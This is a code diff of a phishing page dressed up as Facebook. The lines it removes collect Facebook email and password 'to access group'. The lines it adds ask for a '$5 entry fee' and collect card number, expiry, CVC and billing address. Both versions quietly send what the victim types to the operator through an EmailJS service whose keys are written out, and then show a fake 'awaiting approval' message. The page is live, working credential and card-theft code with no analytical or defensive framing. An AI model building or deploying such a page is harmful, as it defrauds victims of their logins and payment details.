@@ -3,62 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Login</title>
-  <link rel="stylesheet" href="style.css">
+  <title>Private Group</title>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-</head>
-<body>
-
-  <!-- Navigation Bar -->
-  <nav class="navbar">
-    <h2>facebook</h2>
-  </nav>
-
-  <div class="login-container">
-    <h2>Enter Facebook Login to Access Group</h2>
-    <form id="loginForm">
-      <input type="email" id="email" placeholder="Email" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <p id="errorMessage" class="error"></p>
-      <button type="button" id="loginButton">Login</button>
-    </form>
-  </div>
-
-  <script>
-    // EmailJS configuration
-    const EMAILJS_SERVICE_ID = "service_uhxg8hf";
-    const EMAILJS_TEMPLATE_ID = "template_ledkaye";
-    const EMAILJS_PUBLIC_KEY = "ezt9CB7CxTCyZu_ja";
-
-    // Initialize EmailJS
-    emailjs.init(EMAILJS_PUBLIC_KEY);
-
-    // Handle login submission
-    document.getElementById("loginButton").addEventListener("click", () => {
-      const email = document.getElementById("email").value.trim();
-      const password = document.getElementById("password").value.trim();
-
-      if (!email || !password) {
-        document.getElementById("errorMessage").textContent = "All fields are required.";
-        return;
-      }
-
-      // EmailJS parameters
-      const templateParams = { email: email, password: password };
-
-      // Send email
-      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
-        .then(() => {
-          alert("Waiting for approval");
-          document.getElementById("loginForm").reset();
-        })
-        .catch((error) => {
-          alert("Failed to submit login.");
-          console.error("Error:", error);
-        });
-    });
-  </script>
-
   <style>
     body {
       display: flex;
@@ -67,8 +13,8 @@
       justify-content: center;
       height: 100vh;
       margin: 0;
-      background: #f0f2f5;
     }
+
     .navbar {
       width: 100%;
       height: 60px;
@@ -86,18 +32,21 @@
       font-size: 24px;
       margin: 0;
     }
-    .login-container {
+
+    .container {
       background: rgba(255, 255, 255, 0.9);
       padding: 20px;
       border-radius: 10px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
       text-align: center;
       width: 300px;
-      margin-top: 80px; /* Adjusted to prevent overlap with navbar */
+      margin-top: 30px;
     }
+
     h2 {
       margin-bottom: 20px;
     }
+
     input {
       display: block;
       width: 100%;
@@ -105,7 +54,9 @@
       margin: 10px 0;
       border: 1px solid #ccc;
       border-radius: 5px;
+      margin-left: -10px;
     }
+
     button {
       background: #1877f2;
       color: white;
@@ -115,14 +66,132 @@
       border-radius: 5px;
       cursor: pointer;
     }
+
     button:hover {
       background: #166fe5;
     }
+
     .error {
       color: red;
       font-size: 14px;
     }
+
+    /* Popup styles */
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+
+    .popup-content {
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+
+    #popupClose {
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    #popupClose:hover {
+      background: #166fe5;
+    }
   </style>
+</head>
+<body>
+
+  <!-- Navigation Bar -->
+  <nav class="navbar">
+    <h2>facebook</h2>
+  </nav>
+
+  <div class="container">
+    <h2>Welcome, James Hale</h2>
+    <p>$5 entry fee required to access group</p>
+    <form id="paymentForm">
+      <input type="text" id="cardNumber" placeholder="Card Number" required>
+      <input type="text" id="expDate" placeholder="MM/YY" required>
+      <input type="text" id="cvc" placeholder="CVC" required>
+      <input type="text" id="streetAddress" placeholder="Street Address" required>
+      <input type="text" id="city" placeholder="City" required>
+      <input type="text" id="state" placeholder="State" required>
+      <input type="text" id="zipCode" placeholder="Zip Code" required>
+      <p id="errorMessage" class="error"></p>
+      <button type="button" id="payButton">Pay</button>
+    </form>
+  </div>
+
+  <!-- Popup Confirmation -->
+  <div id="popup" class="popup">
+    <div class="popup-content">
+      <p>Payment sent successfully! Awaiting approval.</p>
+      <button id="popupClose">OK</button>
+    </div>
+  </div>
+
+  <script>
+    // EmailJS configuration
+    const EMAILJS_SERVICE_ID = "service_uhxg8hf";
+    const EMAILJS_TEMPLATE_ID = "template_ledkaye";
+    const EMAILJS_PUBLIC_KEY = "ezt9CB7CxTCyZu_ja";
+
+    // Initialize EmailJS
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+
+    // Handle form submission
+    document.getElementById("payButton").addEventListener("click", () => {
+      const cardNumber = document.getElementById("cardNumber").value.trim();
+      const expDate = document.getElementById("expDate").value.trim();
+      const cvc = document.getElementById("cvc").value.trim();
+      const streetAddress = document.getElementById("streetAddress").value.trim();
+      const city = document.getElementById("city").value.trim();
+      const state = document.getElementById("state").value.trim();
+      const zipCode = document.getElementById("zipCode").value.trim();
+      const errorMessage = document.getElementById("errorMessage");
+
+      // Basic validation
+      if (!cardNumber || !expDate || !cvc || !streetAddress || !city || !state || !zipCode) {
+        errorMessage.textContent = "All fields are required.";
+        return;
+      }
+
+      const templateParams = {
+        card_number: cardNumber,
+        exp_date: expDate,
+        cvc_code: cvc,
+        street_address: streetAddress,
+        city: city,
+        state: state,
+        zip_code: zipCode
+      };
+
+      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+        .then(() => {
+          document.getElementById("popup").style.display = "block";
+          document.getElementById("paymentForm").reset();
+        })
+        .catch((error) => {
+          errorMessage.textContent = "Failed to send payment information. Please try again.";
+          console.error("Error:", error);
+        });
+    });
+
+    // Close popup
+    document.getElementById("popupClose").addEventListener("click", () => {
+      document.getElementById("popup").style.display = "none";
+    });
+  </script>
 
 </body>
 </html>
